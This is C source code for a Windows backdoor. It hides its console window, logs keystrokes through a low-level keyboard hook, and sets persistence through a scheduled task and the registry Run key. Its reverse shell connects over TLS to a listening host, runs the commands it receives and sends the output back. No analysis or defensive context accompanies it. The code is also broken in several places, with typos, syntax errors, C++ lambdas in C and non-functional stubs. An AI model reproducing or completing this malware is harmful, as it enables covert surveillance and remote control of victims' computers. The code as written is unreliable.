#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <winreg.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <psapi.h>

#define bzero(p, size) (void) memset((p),0,(size))
#define KEY_LOG_FILE "windows.txt"
#define BUFFER_SIZE 1024;

int sock;
SSL *ssl;

/* Configure SSL*/
void init_openssl() {
	SSL_load_error_strings();
	OpenSSL_add_SSL_algorithms();
}

void cleanup_openssl() {
	EVP_cleanup();
}

SSL_CTX *create_context() {
	const SSL_METHOD *method = TLS_server_method();
	SSL_CTX *ctx = SSL_CTX_new(method);
	if(!ctx) {
		perror("Unable to create SSL context");
		exit(EXIT_FAILURE);
	}
	return ctx;
}

/*Keylogger function */
DWORD WINAPI start_keylogger() {
	char buffer[BUFFER_SIZE];
	int buffer_index = 0;
	FILE *kh = fopen(KEY_LOG_FILE, "a");
	if (!kh) {
		perror("Failed to open log file");
		return 1;
	}

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT {
        if (nCode == HC_ACTION) {
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
				buffer[buffer_index++] = MapirtualKey(p->vkCode, MAPVK_VK_TO_CHAR);
				if (buffer_index >+= BUFFER_SIZE - 1) {
					fwrite(buffer, 1, buffer_index, kh);
					buffer_index = 0;
				}
			}

            // if (kh != NULL) {
            //     if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            //         fprintf(kh, "%c", MapVirtualKey(p->vkCode, MAPVK_VK_TO_CHAR));
            //     }
            //     fclose(kh);
            // }
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }, GetModuleHandle(NULL), 0);
	if (!keyboardHook){
		perror("Failed to set keyboard hook!");
		fclose(kh);
		return 1;
	}

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(keyboardHook);
	if (buffer_index > 0) {
		fwrite(buffer, 1, buffer_index, kh);
	}
	fclose(kh);
    return 0;
}

// Function to hide the procress 
void hide_process() {
	HWND stealth;
	FreeConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_HIDE);

	// Hide the process from task manager 
	PROCESSENTRY32 pe32;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if(Process32First(hSnapshot, &pe32)) {
			do {
				if (strcmp(pe32.szExeFile, "backdoor.exe") == 0) {
					HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
					if (hProcess) {
						TerminateProcess(hProcess, 0);
						CloseHandle(hProcess);
					}
				}
			} while (Process32Next(hSnapshot, &pe32));
		}
		CloseHandle(hSnapshot);
	}
}

/*Persistence function*/
int bootRun(){
	char command[512];
	snprintf(command, sizeof(command),
	"schtasks /create /tn \"WindowsTask\" /tr \"%s\" /sc onlogon /f",
	"C:\\path\\to\\backdoor.exe");

	system(command);
	return 0;
}

// Function to create persistence in windows registry
int create_persistence() {
	HKEY hKey;
	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey)
	if (result != ERROR_SUCCESS) {
		perror("Failed to open registry key");
		return 1;
	}

	result = RegSetValueEx(hKey, "WindowsTask", 0, REG_SZ, (const BYTE *)"C:\\path\\to\\backdoor.exe", strlen("C:\\path\\to\\backdoor.exe") + 1)
	if (result != ERROR_SUCCESS) {
		perror("Failed to set registry value");
		RegCloseKey(hKey);
		return 1;
	}
	RegCloseKey(hKey);
	return 0;
}

// Function to run backdoor as a service
void run_as_service() {
	SERVICE_TABLE_ENTRY ServiceTable[] = {
		{"BackdoorService", (LPSERVICE_MAIN_FUNCTION)start_shell},
		{NULL, NULL}
	};
}
// Concantenation function
char *str_cat(const char *str, int slice_from, int slice_to){
	if(str[0] == '\0') //  Check for empty string
		return NULL;

	size_t str_len = strlen(str);
	
	// Handle negative indices
	if(slice_from < 0){
		slice_from = str_len + slice_from;
	}
	if (slice_to < 0){
		slice_to = str_len + slice_to;
	}

	// validate indicies
	if(slice_from < 0 || slice_to < 0 || slice_from >= str_len || slice_to > str_len || slice_from >= slice_to){
		return NULL;
	}

	// Calculate length and allocate buffer
	size_t buffer_len = slice_to - slice_from + 1; // +1 for null terminator
	char *buffer = calloc(buffer_len, sizeof(char));
	
	if (buffer == NULL){
		perror("Memory allocation failed!");
		return NULL; // allocation failed
	}	
	// copy the slice and null terminate
	strncpy(buffer, str + slice_from, buffer_len - 1);
	buffer[buffer_len - 1] = '\0';

	return buffer;
}

//Shell function
void start_shell(){
	char buffer[BUFFER_SIZE];
	char container[BUFFER_SIZE];
	char response[18384];
	
	while(1){
		bzero(buffer,sizeof(buffer));
		bzero(container,sizeof(container));
		bzero(response,sizeof(response));
	
		// Receive command
		if(SSL_read(ssl, buffer, sizeof(buffer)) <= 0){
			perror("SSL_read failed");
			break;
		}

		
		// Quit conndition
		if(strncmp("q", buffer, 1) == 0){
			SSL_shutdown(ssl);
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		// changing directory
		else if(strncmp("cd ", buffer, 3) == 0){
			chdir(str_cat(buffer, 3, 100));
		}
		// creating persistence
		else if(strncmp("persist", buffer, 7) == 0){
			create_persistence();
		}
		// start keylogger
		else if(strncmp("keylog_start", buffer, 12) == 0){
			CreateThread(NULL, 0, start_keylogger, NULL, 0, NULL);
		}
		// run shell as service
		else if(strncmp("run_as_service", buffer, 14) == 0) {
			run_as_service();
		}
		else {
			// Execute command
			FILE *fp;
			fp = _popen(buffer, "r");
			if (fp == NULL){
				perror("popen failed");
				continue;
			}
			while (fgets(response, sizeof(response), fp)){
				//strncat(total_response, container, sizeof(total_response) - strlen(total_response) - 1);
				SSL_write(ssl, response, strlen(response));
			}
			/* send response
			if(send(sock, total_response, strlen(total_response), 0) < 0){
				perror("send failed");
				break;
			}
			*/
			pclose(fp);
		}
		SSL_write(ssl, response, strlen(response));		
	}
}

// function to connect to server
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){

	//make program invisble during execution
	hide_process();
	// HWND stealth;
	// FreeConsole();
	// stealth = FindWindowA("ConsoleWindowClass", NULL);
	// ShowWindow(stealth, SW_HIDE);
	
	// Initiate connection
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;
	SSL_CTX *ctx;
	
	ServIP = "127.0.0.1";//address of machine that listens for information
	ServPort = 50005;


	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0){
		perror("WSAStartup failed!");
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		perror("Socket creation failed!");
		WSACleanup();
		exit(1);
	}

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);
	
	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){
		Sleep(10);
		goto start;
		
	}

	ctx = create_context();
	ssl = SSL_new(ctx);
	SSL_set_fd(ssl, sock);

	if (SSL_connect(ssl) <= 0) {
		ERR_print_errors_fp(stderr);
		SSL_free(ssl);
		closesocket(sock);
		SSL_CTX_free(ctx);
		WSACleanup();
		exit(1);
	}


	// Start Shell
	start_shell();


	SSL_free(ssl);
	closesocket(sock);
	SSL_CTX_free(ctx);
	cleanup_openssl();
	WSACleanup();
}